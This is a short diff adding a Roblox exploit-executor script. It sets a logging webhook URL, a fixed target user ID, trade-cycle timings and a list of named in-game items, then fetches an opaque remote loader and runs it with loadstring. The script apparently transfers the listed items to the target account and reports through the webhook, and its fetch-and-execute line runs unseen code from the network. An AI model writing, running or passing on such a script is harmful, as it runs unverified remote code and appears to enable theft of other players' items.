@@ -1,0 +1,9 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_271ee53dcd5946a28cff01752b9b5571"
+getgenv().TARGET_ID = 1797504493
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Los Combinasionas"] = true,
+    ["Esok Sekolah"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
